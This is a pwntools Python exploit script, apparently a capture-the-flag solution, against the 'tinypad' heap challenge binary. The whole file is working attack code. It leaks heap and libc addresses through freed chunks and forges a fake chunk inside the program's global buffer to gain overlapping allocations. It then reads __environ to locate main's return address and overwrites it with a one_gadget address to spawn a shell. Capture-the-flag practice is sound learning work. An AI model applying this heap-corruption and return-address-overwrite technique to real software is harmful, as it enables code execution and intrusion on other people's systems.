from pwn import *
import sys
remote_addr = ["",]
libc=ELF('./libc.so.6')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./tinypad_patched")
    context(arch='amd64', os='linux')
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

def debug():
    gdb.attach(p)
    pause()

def add(size, content):
    sla(b'(CMD)>>> ', b'a')
    sla(b'(SIZE)>>> ', str(size))
    sla(b'(CONTENT)>>> ', content)

def edit(index, content):
    sla(b'(CMD)>>> ', b'e')
    sla(b'(INDEX)>>> ', str(index))
    sla(b'(CONTENT)>>> ', content)
    sla(b'(Y/n)>>> ', b'Y')

def delete(index):
    sla(b'(CMD)>>> ', b'D')
    sla(b'(INDEX)>>> ', str(index))

gdb.attach(p, '''
    b *0x400aab
    b *0x400c12
''')

add(0x70, 'a' * 0x70)
add(0x70, 'b' * 0x70)
add(0xf0, 'c' * 0xf0)
add(0xf0, 'd' * 0x90)
delete(2)
delete(1)

ru(b'CONTENT: ')
heap_addr = u64(rc(4).ljust(8, b'\x00')) - 0x80
pr('heap_addr', heap_addr)
delete(3)
libc_base = u64(ru(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x3c4b78
pr('libc_base', libc_base)
delete(4)

add(0x10, 'a' * 0x10)
add(0x100, b'b' * 0xf8 + p64(0x101))
add(0x100, 'c' * 0xf0)
add(0x100, 'd' * 0xf0)

tinypad = 0x602040
fakechunk = tinypad + 0x20
offset = heap_addr + 0x20 - fakechunk
pr('offset', offset)

payload = b'D' * 0x20 + p64(0) + p64(0x101) + p64(fakechunk) * 2
edit(3, payload)
delete(1)

add(0x18, b'a' * 0x10 + p64(offset))
delete(2)

edit(4, b'd' * 0x20 + p64(0) + p64(0x101) + p64(libc_base + 0x3c4b78) * 2)

one = libc_base + 0xf1147
environ = libc_base + libc.sym['__environ']

padding = b'f' * 0xd0 + b'a' * 8 + p64(environ) + b'a' * 8 + p64(0x602148)
add(0xf0, padding)
main_ret = u64(ru(b'\x7f')[-6:].ljust(8, b'\x00')) - 240
pr('main_ret', main_ret)

edit(2, p64(main_ret))
edit(1, p64(one))

shell()
